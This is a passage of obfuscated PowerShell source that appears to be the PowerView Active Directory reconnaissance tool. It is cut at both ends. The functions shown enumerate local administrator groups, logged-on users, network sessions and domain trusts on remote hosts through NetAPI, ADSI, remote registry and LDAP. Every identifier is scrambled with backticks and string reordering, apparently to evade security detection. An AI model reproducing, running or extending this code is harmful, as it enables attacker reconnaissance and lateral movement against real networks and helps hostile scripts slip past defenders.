                    ${appl`iE`d`siTe} | &("{2}{1}{0}"-f'ber','m','Add-Me') ("{1}{2}{0}" -f'operty','Note','pr') ("{3}{1}{2}{0}"-f'e','ntainerNa','m','Co') ${_}."DISTI`NG`UI`s`HEDnamE"
                    ${aPPl`I`e`DsITE} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') ("{3}{1}{2}{0}" -f'y','p','ert','Notepro') ("{1}{2}{0}{3}" -f'ter','Com','pu','Name') ${_}."s`ITeOB`JECTBL"
                    ${a`p`P`lIEdSIte}."psob`jE`Ct"."TY`pEn`Ames".("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{5}{4}{0}{3}" -f'LocalGr','ower','P','oup','ew.GPO','Vi'))
                    ${aP`PLi`Ed`sItE}
                }
            }
        }
    }
}










function ge`T-nEtLocAl`Gr`O`Up {


    [CmdletBinding(dEfAULTpArametERseTNamE = {"{0}{1}" -f'WinN','T'})]
    param(
        [Parameter(paRaMEteRseTnAme = 'API', posItIoN=0, VALuEfROMPIPEliNE=${T`RUe})]
        [Parameter(ParAmETeRSeTnAMe = "Wi`NnT", PosiTiON=0, vALuefromPiPELInE=${T`RUe})]
        [Alias({"{2}{0}{1}"-f 'tNam','e','Hos'})]
        [String[]]
        ${Co`Mp`U`Ter`NaME} = ${EnV:Com`put`ER`NA`ME},

        [Parameter(pARameteRSETName = "W`INnT")]
        [Parameter(ParAmeterSETnaMe = 'API')]
        [ValidateScript({&("{1}{0}"-f'h','Test-Pat') -Path ${_} })]
        [Alias({"{1}{0}{2}"-f 'tL','Hos','ist'})]
        [String]
        ${C`oMpu`Te`RfiLe},

        [Parameter(paramEtErsETnAME = "w`InNT")]
        [Parameter(ParAmEteRSetnaME = 'API')]
        [String]
        ${g`R`OuPNa`ME} = ("{2}{3}{1}{0}" -f'ators','str','Admi','ni'),

        [Parameter(parAMetErsetnaME = 'API')]
        [Switch]
        ${A`pi},

        [Switch]
        ${iSd`omAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AiN`Sid}
    )

    process {

        ${se`RVe`RS} = @()

        
        if(${c`ompuTe`R`FiLe}) {
            ${SErV`eRs} = &("{1}{2}{3}{0}" -f'tent','Get-C','o','n') -Path ${C`OMpUtE`RFI`LE}
        }
        else {
            
            ${SeRv`ers} += ${coMPU`T`ErN`AME} | &("{2}{0}{1}" -f 'Nam','eField','Get-')
        }

        
        
        ForEach(${Se`RVeR} in ${SEr`VERs}) {

            if(${a`pi}) {
                

                
                ${Qu`ERy`leveL} = 2
                ${pTRi`N`Fo} =   (&("{0}{1}"-f'iTe','m')  ('vA'+'RIa'+'blE:j8'+'L9Yc'))."Val`UE"::"Z`ERo"
                ${EntrI`e`SReaD} = 0
                ${ToT`A`lrEaD} = 0
                ${rES`U`mEHaNDLE} = 0

                
                ${Re`SuLt} = ${NeT`APi`32}::"N`eTLoCA`Lg`ROUp`getme`M`BeRS"(${sE`RV`eR}, ${G`Ro`UpNaME}, ${QUe`RyL`EvEL}, [ref]${P`TRI`NFo}, -1, [ref]${e`NTriesR`E`AD}, [ref]${TOT`ALRE`Ad}, [ref]${REs`UmehA`NDLe})

                
                ${o`FF`sET} = ${Pt`R`INfo}.("{1}{2}{0}"-f'Int64','T','o').Invoke()

                ${locA`LUsE`RS} = @()

                
                if ((${Re`SU`LT} -eq 0) -and (${of`Fs`Et} -gt 0)) {

                    
                    ${INCr`Em`EnT} = ${lOcALG`R`OUP_mE`mB`ERs`_INF`o`_2}::("{2}{0}{1}" -f'tSi','ze','Ge').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${eNtRIE`S`ReAD}); ${I}++) {
                        
                        ${ne`wI`NTptr} = &("{0}{2}{1}"-f 'N','Object','ew-') ("{3}{2}{0}{1}"-f'nt','ptr','tem.I','Sys') -ArgumentList ${o`FFSET}
                        ${IN`Fo} = ${ne`Wi`NtPTR} -as ${L`ocA`Lgr`oU`p_membERs_`Info_2}

                        ${OFF`seT} = ${N`E`Win`TpTR}.("{2}{0}{1}"-f 'I','nt64','To').Invoke()
                        ${o`FFseT} += ${incR`em`E`NT}

                        ${SI`DST`RINg} = ''
                        ${r`eS`ULt2} = ${AdvA`Pi`32}::"co`N`V`e`R`TsiDToStRInGSid"(${in`FO}."lgRm`I2_`sId", [ref]${S`idST`Ring});${l`Ast`ERror} =   ${5L`Op3}::("{4}{1}{3}{2}{0}" -f 'in32Error','L','stW','a','Get').Invoke()

                        if(${Re`SuL`T2} -eq 0) {
                            
                        }
                        else {
                            ${i`sG`RoUP} = $(${in`Fo}."lGRM`i`2_Si`dUsAge" -ne ("{0}{1}{2}" -f'Sid','Ty','peUser'))
                            ${LoCAL`U`sE`RS} += @{
                                ("{2}{1}{0}" -f 'e','Nam','Computer') = ${Se`RV`eR}
                                ("{0}{1}{2}" -f 'Accou','nt','Name') = ${iN`Fo}."LGrm`i2`_d`oM`AinA`NDn`AmE"
                                'SID' = ${s`I`D`StrING}
                                ("{0}{1}" -f 'I','sGroup') = ${I`sGr`Oup}
                                ("{0}{1}"-f'Typ','e') = ("{1}{0}"-f 'r','LocalUse')
                            }
                        }
                    }

                    
                    ${nu`lL} = ${NeTAp`I`32}::("{4}{0}{1}{3}{2}{5}" -f 'etApiB','uffer','re','F','N','e').Invoke(${Ptr`IN`Fo})

                    ${M`Achi`NE`SID} = (${l`o`CAL`USErS} | &("{1}{0}{2}" -f'je','Where-Ob','ct') {${_}['SID'] -like ("{1}{0}" -f '0','*-50')})['SID']
                    ${maC`h`inE`SId} = ${mAchi`N`eS`Id}.("{2}{1}{0}"-f 'tring','bs','Su').Invoke(0, ${M`Ach`i`NESid}.("{1}{0}{2}" -f 'astInd','L','exOf').Invoke('-'))
                    try {
                        ForEach(${L`Oc`AlUSer} in ${loc`AluSE`RS}) {
                            if(${DOmAI`N`sid} -and (${L`OCaluS`ER}['SID'] -match ${DO`MAiN`siD})) {
                                ${lO`C`ALuSeR}[("{0}{1}" -f 'IsD','omain')] = ${TR`UE}
                            }
                            elseif(${LOC`A`luSeR}['SID'] -match ${mA`ChiNEs`iD}) {
                                ${Lo`CA`LuSEr}[("{0}{1}" -f 'IsD','omain')] = ${f`AL`SE}
                            }
                            else {
                                ${LOCal`US`er}[("{1}{0}{2}" -f 'sDo','I','main')] = ${tR`UE}
                            }
                            if(${is`domA`IN}) {
                                if(${lo`CAlus`ER}[("{0}{1}" -f 'IsD','omain')]) {
                                    ${lOCA`l`U`Ser}
                                }
                            }
                            else {
                                ${lO`Ca`LusER}
                            }
                        }
                    }
                    catch { }
                }
                else {
                    
                }
            }

            else {
                
                try {
                    ${LO`c`ALu`sErs} = @()
                    ${mEm`Be`Rs} = @($([ADSI]"WinNT://$Server/$GroupName,group")."psB`ASe"."I`NvO`ke"(("{0}{1}" -f 'Me','mbers')))

                    ${MemB`ers} | &("{2}{3}{1}{0}"-f 'ct','-Obje','F','orEach') {
                        ${loC`AL`UsEr} = ([ADSI]${_})

                        ${A`dSPa`TH} = ${L`O`cALusEr}.("{2}{0}{1}"-f'e','Get','Invok').Invoke(("{1}{0}{2}"-f'dsP','A','ath')).("{1}{0}"-f 'ace','Repl').Invoke(("{1}{0}" -f'//','WinNT:'), '')

                        if((  (  &("{0}{2}{1}"-f'Get-vAria','E','Bl')  hx0f -vAlUEONl )::("{1}{0}{2}" -f'c','Mat','hes').Invoke(${a`ds`PATh}, '/'))."co`UNt" -eq 1) {
                            
                            ${MEMBE`R`IS`d`omAiN} = ${T`Rue}
                            ${nA`me} = ${Ads`PaTH}.("{1}{0}"-f 'ace','Repl').Invoke('/', '\')
                        }
                        else {
                            
                            ${MEM`B`ER`i`sdomaIn} = ${FA`L`Se}
                            ${N`AmE} = ${a`dsP`AtH}.("{1}{2}{0}{3}"-f 'i','Subs','tr','ng').Invoke(${AD`sP`ATH}.("{0}{1}{2}" -f 'I','ndexO','f').Invoke('/')+1).("{0}{1}{2}" -f 'Repla','c','e').Invoke('/', '\')
                        }

                        ${Is`g`RoUp} = (${lo`ca`LUser}."S`cHe`mAClAssna`Me" -like ("{1}{0}"-f'oup','gr'))
                        if(${I`SD`omAiN}) {
                            if(${MEm`BERISD`Om`AIn}) {
                                ${lO`Ca`l`UseRS} += @{
                                    ("{1}{2}{0}"-f 'me','Com','puterNa') = ${sER`VEr}
                                    ("{3}{1}{0}{2}"-f 'countNa','c','me','A') = ${N`AME}
                                    'SID' = ((&("{0}{2}{1}" -f'New-O','t','bjec') ("{0}{2}{5}{3}{9}{10}{1}{7}{6}{8}{4}" -f 'Sys','c','t','ecuri','ntifier','em.S','S','ipal.','ecurityIde','ty.','Prin')(${L`OCAL`Us`ER}.("{1}{0}" -f 'keGet','Invo').Invoke(("{2}{0}{1}" -f'ct','SID','Obje')),0))."V`ALuE")
                                    ("{2}{1}{0}" -f'roup','G','Is') = ${Isg`ROUp}
                                    ("{2}{0}{1}"-f's','Domain','I') = ${mEmb`ERIs`DOMAiN}
                                    ("{1}{0}"-f 'ype','T') = ("{2}{0}{1}"-f 'ocalUs','er','L')
                                }
                            }
                        }
                        else {
                            ${lOc`AluS`ErS} += @{
                                ("{0}{3}{2}{1}"-f 'C','terName','u','omp') = ${S`eRV`ER}
                                ("{2}{1}{0}" -f 'ountName','cc','A') = ${Na`Me}
                                'SID' = ((&("{0}{2}{1}"-f'Ne','-Object','w') ("{7}{4}{0}{3}{10}{2}{1}{9}{12}{11}{6}{8}{5}"-f't','rit','cu','e','s','dentifier','cur','Sy','ityI','y','m.Se','incipal.Se','.Pr')(${lOC`A`LUSEr}.("{1}{0}{2}"-f'vok','In','eGet').Invoke(("{2}{1}{0}" -f'ID','jectS','Ob')),0))."V`ALuE")
                                ("{1}{0}" -f'roup','IsG') = ${isg`RouP}
                                ("{2}{0}{1}"-f 'Dom','ain','Is') = ${MeM`B`ER`isD`oMain}
                                ("{0}{1}" -f'T','ype') = ("{1}{2}{0}"-f 'er','L','ocalUs')
                            }
                        }
                    }
                    ${l`OC`A`LusErs}
                }
                catch {
                    &("{0}{1}{2}" -f 'Write-Ve','rbo','se') ('Get-N'+'e'+'tLo'+'cal'+'Group '+'erro'+'r'+' '+'fo'+'r '+"$Server "+': '+"$_")
                }
            }
        }
    }
}


filter gET-ne`TloGGe`Don {


    [CmdletBinding()]
    param(
        [Parameter(vALueFROMPiPeLinE=${T`RUe})]
        [Alias({"{1}{2}{0}"-f'tName','Ho','s'})]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        ${C`o`M`PuteRnAME} = ("{0}{1}{2}"-f'local','h','ost')
    )

    
    ${C`Om`PuteR} = ${co`mPuTER`N`Ame} | &("{0}{2}{1}"-f 'G','d','et-NameFiel')

    
    ${qUe`Ryl`eVEL} = 1
    ${PTR`iN`FO} =   ( &("{1}{0}"-f 'm','ITe') VaRiablE:j8l9Yc  )."vAl`UE"::"Z`eRO"
    ${eNt`RI`ES`Read} = 0
    ${tO`TaLrE`Ad} = 0
    ${rEsU`MEhAND`LE} = 0

    
    ${R`ESu`lT} = ${NE`Tap`I32}::"Net`WK`sT`AusErENuM"(${C`OM`Puter}, ${qu`er`ylev`el}, [ref]${P`TR`iNfo}, -1, [ref]${entRI`esre`Ad}, [ref]${tOT`AL`REaD}, [ref]${rEs`UMe`hAnDLE})

    
    ${oFfs`ET} = ${PTR`I`NFO}.("{1}{2}{0}"-f'nt64','To','I').Invoke()

    
    if ((${Re`S`Ult} -eq 0) -and (${OFF`S`eT} -gt 0)) {

        
        ${I`NcReMe`Nt} = ${w`k`stA_U`ser_I`Nf`o_1}::("{1}{2}{0}"-f 'e','Get','Siz').Invoke()

        
        for (${I} = 0; (${i} -lt ${En`TR`iEsrE`AD}); ${I}++) {
            
            ${NeW`IntP`TR} = &("{0}{2}{1}" -f'New-Obj','t','ec') ("{1}{0}{3}{2}" -f 'yst','S','r','em.Intpt') -ArgumentList ${o`FFs`et}
            ${iN`Fo} = ${NE`wiNt`ptr} -as ${wkSt`A_US`e`R_iN`FO_1}

            
            ${l`og`gedON} = ${iN`FO} | &("{2}{0}{1}"-f'lect-Ob','ject','Se') ('*')
            ${l`o`ggE`dOn} | &("{3}{2}{1}{0}" -f 'er','b','Mem','Add-') ("{2}{1}{3}{0}"-f 'erty','t','No','eprop') ("{3}{2}{1}{0}" -f 'Name','r','ompute','C') ${cO`m`PU`TER}
            ${ofF`set} = ${NeW`INT`Ptr}.("{0}{1}{2}"-f'To','Int6','4').Invoke()
            ${o`F`FSEt} += ${i`N`C`ReMeNT}
            ${l`oG`Ge`Don}
        }

        
        ${n`ULL} = ${NETa`p`i32}::("{2}{0}{1}{3}{4}" -f't','ApiB','Ne','uf','ferFree').Invoke(${PTrIN`Fo})
    }
    else {
        &("{2}{3}{4}{1}{0}" -f 'e','s','W','rite-Verb','o') "Error: $(([ComponentModel.Win32Exception] $Result).Message) "
    }
}


filter geT-`NE`TseSsI`on {


    [CmdletBinding()]
    param(
        [Parameter(valueFRomPipeLiNE=${t`RUE})]
        [Alias({"{2}{0}{1}"-f 'tN','ame','Hos'})]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        ${Compu`TE`RNaME} = ("{0}{1}{2}" -f 'l','o','calhost'),

        [String]
        ${usErn`A`mE} = ''
    )

    
    ${COMPU`T`eR} = ${CoM`Pu`T`e`Rname} | &("{1}{2}{0}{3}" -f 'm','Get-','Na','eField')

    
    ${Q`UErYlEv`eL} = 10
    ${pT`RIn`Fo} =  ${j`8`L9yC}::"ze`RO"
    ${EN`Tr`IEsreaD} = 0
    ${TOt`Al`Re`AD} = 0
    ${RE`SU`MehAnD`LE} = 0

    
    ${Re`SUlT} = ${NET`A`pi`32}::("{3}{2}{1}{0}" -f'm','nEnu','etSessio','N').Invoke(${CoM`P`Ut`eR}, '', ${USErn`A`me}, ${qu`Er`YlEvEl}, [ref]${ptRi`N`FO}, -1, [ref]${eNT`RiEsR`eaD}, [ref]${t`OtALR`E`AD}, [ref]${RESum`E`haN`DLE})

    
    ${Off`set} = ${PT`Ri`NfO}.("{0}{2}{1}" -f 'T','Int64','o').Invoke()

    
    if ((${R`es`UlT} -eq 0) -and (${O`Ffs`ET} -gt 0)) {

        
        ${iN`cRem`EnT} = ${SeS`Si`O`N_Info_`10}::("{0}{1}" -f'Ge','tSize').Invoke()

        
        for (${i} = 0; (${I} -lt ${eNt`Rie`sREad}); ${I}++) {
            
            ${newi`Nt`pTR} = &("{1}{0}{2}" -f 'c','New-Obje','t') ("{3}{1}{4}{0}{2}" -f 'In','st','tptr','Sy','em.') -ArgumentList ${o`FFSeT}
            ${i`NFo} = ${nE`WiNTP`TR} -as ${Se`Ss`io`N_INF`O`_10}

            
            ${SEs`S`iOns} = ${I`NfO} | &("{2}{4}{3}{0}{1}" -f'jec','t','Select','b','-O') ('*')
            ${seS`s`Ions} | &("{0}{1}{2}" -f'Add-M','em','ber') ("{2}{1}{3}{0}"-f 'erty','o','Notepr','p') ("{1}{0}{2}"-f 'terNam','Compu','e') ${co`MpUT`eR}
            ${O`FfseT} = ${NEwi`N`T`PTR}.("{1}{0}{2}"-f 'n','ToI','t64').Invoke()
            ${of`F`sET} += ${i`NCre`MeNT}
            ${SE`sSiOns}
        }
        
        ${N`Ull} = ${nEt`AP`i32}::("{0}{1}{3}{2}" -f 'N','et','ee','ApiBufferFr').Invoke(${P`Tri`NfO})
    }
    else {
        &("{2}{1}{3}{0}" -f 'ose','Ver','Write-','b') "Error: $(([ComponentModel.Win32Exception] $Result).Message) "
    }
}


filter GE`T-loGGEdO`N`locAL {


    [CmdletBinding()]
    param(
        [Parameter(vALUeFRomPiPEliNE=${TR`UE})]
        [Alias({"{1}{0}" -f 'e','HostNam'})]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        ${c`oM`PUtERNa`mE} = ("{2}{0}{1}"-f 'alh','ost','loc')
    )

    
    ${c`o`Mpu`TEr`NAme} = &("{4}{0}{2}{3}{1}" -f't-Nam','eld','e','Fi','Ge') -Object ${COmPUTer`N`A`me}

    try {
        
        ${r`EG} =  ${1`m`Pzl}::("{2}{1}{3}{0}" -f 'seKey','emot','OpenR','eBa').Invoke(("{1}{0}" -f'rs','Use'), "$ComputerName")

        
        ${R`eG}.("{1}{4}{2}{3}{0}" -f 's','GetS','y','Name','ubKe').Invoke() | &("{3}{0}{1}{2}" -f 'er','e-O','bject','Wh') { ${_} -match (('S-1-5-21-['+'0'+'-'+'9'+']+-'+'[0'+'-9]+-'+'['+'0-9]+-['+'0'+'-9]+{0}')  -F[CHar]36) } | &("{0}{1}{3}{2}"-f'ForEa','ch-Obj','t','ec') {
            ${u`SeRn`Ame} = &("{0}{1}{3}{2}"-f'C','on','SidToName','vert-') ${_}

            ${p`AR`TS} = ${uS`ernA`mE}.("{1}{0}" -f'lit','Sp').Invoke('\')
            ${uSERdO`m`AIn} = ${nU`Ll}
            ${Us`erN`AME} = ${P`AR`Ts}[-1]
            if (${paR`TS}."Le`NG`TH" -eq 2) {
                ${uSE`R`dom`AIN} = ${pA`R`Ts}[0]
            }

            ${lOCa`lL`O`G`GEdOnus`Er} = &("{2}{1}{0}"-f't','w-Objec','Ne') ("{1}{0}{2}" -f'Obje','PS','ct')
            ${LOc`A`Llo`GG`eDOnUSER} | &("{3}{0}{1}{2}"-f'd','-Me','mber','Ad') ("{2}{1}{0}{3}"-f 'ep','ot','N','roperty') ("{0}{3}{2}{1}" -f'Co','e','Nam','mputer') "$ComputerName"
            ${localLoGg`edO`N`USer} | &("{1}{2}{0}{3}" -f'e','A','dd-M','mber') ("{2}{1}{0}" -f'rty','rope','Notep') ("{1}{2}{0}" -f'rDomain','Us','e') ${US`e`R`DomaIn}
            ${loCA`l`logge`donuS`eR} | &("{1}{2}{0}" -f'Member','Add','-') ("{0}{1}{2}" -f 'No','teproper','ty') ("{0}{1}" -f'User','Name') ${U`seRnA`ME}
            ${L`o`C`A`lLOGGE`DONuseR} | &("{0}{1}{2}" -f 'Add','-M','ember') ("{1}{0}{2}"-f 'tepro','No','perty') ("{1}{2}{0}"-f'D','UserS','I') ${_}
            ${LOcalLO`g`ge`dOnu`Ser}
        }
    }
    catch { }
}








function Get`-`NEtdo`MaiNT`RUsT {


    [CmdletBinding()]
    param(
        [Parameter(posITion=0, VALUEFRoMpipelINe=${TR`UE})]
        [String]
        ${DomA`iN},

        [String]
        ${DOm`AI`NcoNTR`oLl`eR},

        [String]
        ${Ad`spAtH},

        [Switch]
        ${A`pi},

        [Switch]
        ${Ld`Ap},

        [ValidateRange(1,10000)]
        [Int]
        ${paGE`SIZe} = 200,

        [Management.Automation.PSCredential]
        ${cR`e`d`entiAL}
    )

    begin {
        ${tru`s`Tat`Tr`IbuTEs} = @{
            [uint32]("{0}{3}{2}{1}" -f'0x0','01','00','000') = ("{1}{2}{4}{0}{3}"-f'nsiti','no','n_t','ve','ra')
            [uint32]("{2}{1}{0}" -f '0002','000','0x0') = ("{0}{2}{3}{1}" -f'u','ly','pl','evel_on')
            [uint32]("{2}{1}{0}" -f'004','0','0x0000') = ("{1}{4}{2}{3}{0}"-f 'n','qu','ined','_domai','arant')
            [uint32]("{0}{1}{2}{3}" -f '0x0','0','00','0008') = ("{2}{3}{5}{0}{1}{4}"-f'si','ti','forest_tr','a','ve','n')
            [uint32]("{0}{2}{1}"-f'0','00000010','x') = ("{2}{3}{4}{5}{1}{0}"-f 'on','zati','c','ro','s','s_organi')
            [uint32]("{1}{2}{0}"-f '0020','0x0','000') = ("{2}{1}{0}{3}"-f'n_f','hi','wit','orest')
            [uint32]("{2}{0}{1}"-f '00','040','0x000') = ("{2}{4}{0}{3}{1}"-f'as_exte','nal','tr','r','eat_')
            [uint32]("{2}{3}{0}{1}" -f'008','0','0x0','000') = ("{2}{3}{6}{5}{1}{4}{0}" -f'n','cryp','t','rust_u','tio','en','ses_rc4_')
            [uint32]("{2}{3}{0}{1}"-f'00000','100','0','x') = ("{4}{3}{1}{0}{2}"-f'es_aes_ke','s','ys','rust_u','t')
            [uint32]("{0}{2}{1}{3}" -f '0x','00','0','00200') = ("{5}{3}{1}{4}{0}{2}" -f'le','ization_no_tgt_','gation','rgan','de','cross_o')
            [uint32]("{1}{2}{0}"-f '0','0x','0000040') = ("{0}{2}{1}"-f 'pim_','st','tru')
        }
    }

    process {

        if(-not ${D`o`mAIN}) {
            
            ${S`OUR`cedomain} = (&("{0}{1}{3}{2}" -f 'G','e','n','t-NetDomai') -Credential ${cR`eDE`NtIAl})."n`AMe"
        }
        else {
            ${S`oU`Rce`DomAIN} = ${dO`m`AIN}
        }

        if(${ld`Ap} -or ${Ads`pATH}) {

            ${tRuSTsea`R`C`HER} = &("{1}{3}{4}{2}{0}"-f 'archer','G','inSe','et-','Doma') -Domain ${SoUR`c`E`d`omAiN} -DomainController ${d`o`m`AincOntRo`LleR} -Credential ${cR`E`dE`NtIal} -PageSize ${p`AgEs`IzE} -ADSpath ${A`DSp`AtH}

            ${S`oURce`s`iD} = &("{2}{1}{0}{3}" -f'S','ain','Get-Dom','ID') -Domain ${s`o`Ur`CedoMA`IN} -DomainController ${D`oM`AINcO`Ntr`oLL`eR}

            if(${T`Ru`sTSeaRcheR}) {

                ${trustS`Ea`RCh`er}."f`IlteR" = ("{0}{3}{2}{4}{6}{1}{8}{7}{5}"-f'(','t','ject','ob','C','dDomain)','lass=','e','rust')

                ${re`sU`LtS} = ${TR`U`stseA`R`cHeR}.("{0}{1}" -f 'Fi','ndAll').Invoke()
                ${R`eS`Ults} | &("{1}{2}{0}" -f'Object','W','here-') {${_}} | &("{1}{3}{0}{2}" -f'ch-O','Fo','bject','rEa') {
                    ${p`RO`PS} = ${_}."PRo`P`Er`TIEs"
                    ${Do`maI`Nt`RUSt} = &("{1}{2}{0}" -f 'bject','New-','O') ("{1}{0}{2}"-f 'O','PS','bject')

                    ${tr`US`TaTt`RiB} = @()
                    ${tRUSTa`TtR`ib} += ${TRUstA`TtRI`BuT`Es}."Ke`YS" | &("{3}{1}{2}{0}"-f 'ect','here-','Obj','W') { ${p`Ro`PS}."tRUst`At`Tr`i`BuTeS"[0] -band ${_} } | &("{1}{3}{0}{2}"-f'ach','F','-Object','orE') { ${tr`Us`Tat`TRibuT`es}[${_}] }

                    ${d`Ir`eCTioN} = Switch (${p`RO`Ps}."TR`Us`TD`iReC`TIon") {
                        0 { ("{2}{0}{1}" -f 'able','d','Dis') }
                        1 { ("{1}{2}{0}"-f 'ound','In','b') }
                        2 { ("{0}{1}{2}"-f'O','utboun','d') }
                        3 { ("{0}{1}{2}"-f'Bidir','ectio','nal') }
                    }
                    ${OBJEC`TGU`ID} = &("{2}{3}{1}{0}"-f 'ct','bje','New','-O') ("{1}{0}" -f 'id','Gu') @(,${pR`Ops}."O`BJEc`TguiD"[0])
                    ${T`ARGEt`SID} = (&("{1}{2}{0}" -f 'ject','N','ew-Ob') ("{4}{3}{6}{2}{1}{5}{8}{9}{7}{0}"-f'r','in','r','stem.Secu','Sy','c','rity.P','ityIdentifie','ipal','.Secur')(${prO`ps}."Se`CUriTyiDeNti`Fi`er"[0],0))."v`ALuE"
                    ${DOMAi`NtrU`St} | &("{2}{0}{1}" -f'dd-','Member','A') ("{0}{3}{1}{2}" -f'Notepr','e','rty','op') ("{0}{1}{2}" -f'Sourc','eNa','me') ${S`ourC`E`Do`mAin}
                    ${do`mAInT`RUSt} | &("{0}{1}{2}"-f'Add-','Membe','r') ("{0}{2}{3}{1}" -f'N','erty','otepr','op') ("{2}{0}{1}" -f'SI','D','Source') ${s`Ou`Rc`esId}
                    ${dOma`I`NTrUSt} | &("{0}{2}{1}" -f 'Add','ember','-M') ("{2}{1}{3}{0}" -f'operty','tep','No','r') ("{3}{1}{0}{2}"-f'm','tNa','e','Targe') ${P`ROPS}."n`AmE"[0]
                    ${d`oMa`iN`TruSt} | &("{1}{3}{2}{0}" -f'er','Add-','emb','M') ("{0}{2}{1}{3}" -f'Not','rop','ep','erty') ("{1}{0}{2}" -f 'rget','Ta','SID') ${T`ArgE`TS`Id}
                    ${DOm`AI`NtR`UST} | &("{2}{0}{1}" -f'dd-Mem','ber','A') ("{1}{2}{0}{3}"-f 'rt','Notepro','pe','y') ("{0}{2}{1}" -f'Objec','uid','tG') "{$ObjectGuid}"
                    ${DOMainTr`U`ST} | &("{0}{1}{2}" -f'A','dd-Memb','er') ("{2}{0}{1}" -f'ro','perty','Notep') ("{1}{0}{2}" -f 'tTy','Trus','pe') $(${Tru`s`T`ATTRIB} -join ',')
                    ${d`OM`AINTr`UsT} | &("{0}{2}{1}"-f 'Add','ber','-Mem') ("{0}{2}{1}{3}"-f 'Not','rop','ep','erty') ("{1}{2}{3}{4}{0}"-f'rection','Tr','u','stD','i') "$Direction"
                    ${DO`mAi`NTru`St}."psO`B`Ject"."T`Ype`NAmES".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}{5}{4}{3}"-f 'owerView.Domai','n','P','LDAP','ust','Tr'))
                    ${DoMain`TR`USt}
                }
                ${ReSu`L`Ts}.("{0}{1}" -f'dispo','se').Invoke()
                ${TR`USTSE`ARC`hER}.("{0}{1}{2}"-f 'di','s','pose').Invoke()
            }
        }
        elseif(${a`pi}) {
            if(-not ${D`OMAiNCo`NTRO`lleR}) {
                ${dO`MAi`NCO`NtroLleR} = &("{2}{4}{0}{3}{5}{6}{1}"-f'tDom','oller','Get','ain','-Ne','Cont','r') -Credential ${cr`EDE`NT`iaL} -Domain ${s`o`UR`ceDomAIn} | &("{1}{2}{3}{0}" -f'ct','Sele','ct-Obj','e') -First 1 | &("{2}{0}{3}{1}{4}"-f'c','b','Sele','t-O','ject') -ExpandProperty ("{0}{1}" -f'Nam','e')
            }

            if(${doMAI`Nco`N`TR`oL`LER}) {
                
                ${pTR`in`Fo} =   (&("{1}{2}{0}" -f'E','vARi','AbL') ("J8L9Y"+"C")  )."Val`Ue"::"ZE`Ro"

                
                ${FL`AGS} = 63
                ${DoM`A`In`couNT} = 0

                
                ${R`Es`Ult} = ${NetA`pi`32}::"DSE`NUMEr`At`edo`MaIntRU`sTs"(${dOm`Ai`NcoNt`Ro`LLer}, ${FlA`gS}, [ref]${pTr`In`Fo}, [ref]${dOmAINc`O`Unt})

                
                ${o`F`FSEt} = ${PT`RIn`FO}.("{2}{1}{0}"-f 'nt64','oI','T').Invoke()

                
                if ((${re`sU`lt} -eq 0) -and (${o`F`Fset} -gt 0)) {

                    
                    ${IN`cR`EmEnt} = ${dS`_d`OmaIn`_t`RusTS}::("{0}{1}"-f'G','etSize').Invoke()

                    
                    for (${I} = 0; (${I} -lt ${doMainC`O`UNT}); ${i}++) {
                        
                        ${Ne`wiN`Tp`Tr} = &("{2}{1}{0}" -f'ct','ew-Obje','N') ("{0}{4}{2}{1}{3}" -f'Syst','tp','n','tr','em.I') -ArgumentList ${o`FFS`ET}
                        ${i`Nfo} = ${ne`wintp`TR} -as ${Ds_dOMA`IN`_`TRUS`TS}

                        ${o`FfseT} = ${n`ew`INTPtr}.("{2}{1}{0}" -f'Int64','o','T').Invoke()
                        ${O`FfsET} += ${IN`CreMe`Nt}

                        ${SI`DsTr`INg} = ""
                        ${RE`S`Ult} = ${ADVA`P`i32}::"co`NveRt`sId`TOsTRI`NG`Sid"(${In`FO}."Doma`in`sId", [ref]${s`idS`TR`inG});${L`AsT`errOr} =  ${5`lop3}::("{0}{2}{3}{1}"-f 'GetL','or','astWin','32Err').Invoke()

                        if(${R`e`SULT} -eq 0) {
                            &("{1}{2}{0}"-f'se','Write-Verb','o') "Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${DO`MAiNtru`ST} = &("{2}{0}{1}{3}" -f 'w','-Ob','Ne','ject') ("{0}{2}{1}"-f 'PS','ject','Ob')
                            ${D`oMaIN`TRuSt} | &("{2}{0}{1}"-f'dd-Mem','ber','A') ("{2}{1}{0}"-f'rty','teprope','No') ("{0}{2}{1}" -f 'So','Domain','urce') ${soUR`cE`dO`M`AIN}
                            ${DOMai`N`Tr`UST} | &("{1}{0}{2}"-f 'dd-M','A','ember') ("{0}{1}{2}" -f'No','t','eproperty') ("{6}{2}{4}{0}{5}{1}{3}" -f 'C','l','c','ler','eDomain','ontro','Sour') ${d`OmainCO`N`TrolL`Er}
                            ${doM`A`int`RUSt} | &("{2}{1}{0}{3}"-f'd-Membe','d','A','r') ("{2}{1}{0}{3}" -f 'p','epro','Not','erty') ("{0}{4}{1}{2}{3}"-f'N','iosDoma','i','nName','etb') ${i`NfO}."NE`T`BiosdomaIN`N`AmE"
                            ${Dom`AINt`RU`st} | &("{0}{2}{1}" -f 'A','-Member','dd') ("{0}{2}{1}{3}" -f'N','pro','ote','perty') ("{2}{3}{0}{1}" -f 'a','inName','Dns','Dom') ${in`Fo}."D`NsDOMainn`A`Me"
                            ${dOMAi`N`TrUst} | &("{2}{0}{1}"-f 'd-M','ember','Ad') ("{3}{1}{0}{2}" -f 'ropert','otep','y','N') ("{0}{1}"-f 'Fl','ags') ${I`NFo}."f`laGs"
                            ${doma`IN`Tr`USt} | &("{1}{2}{0}"-f'er','Add-Me','mb') ("{0}{1}{2}" -f'Notep','rop','erty') ("{1}{2}{0}" -f 'entIndex','P','ar') ${i`NfO}."pAREnt`i`Nd`ex"
                            ${DOma`iNTRu`sT} | &("{1}{0}{2}{3}"-f'Mem','Add-','be','r') ("{1}{2}{3}{0}" -f'ty','Not','epro','per') ("{0}{1}{2}" -f 'T','rustT','ype') ${in`FO}."t`RU`StTYpe"
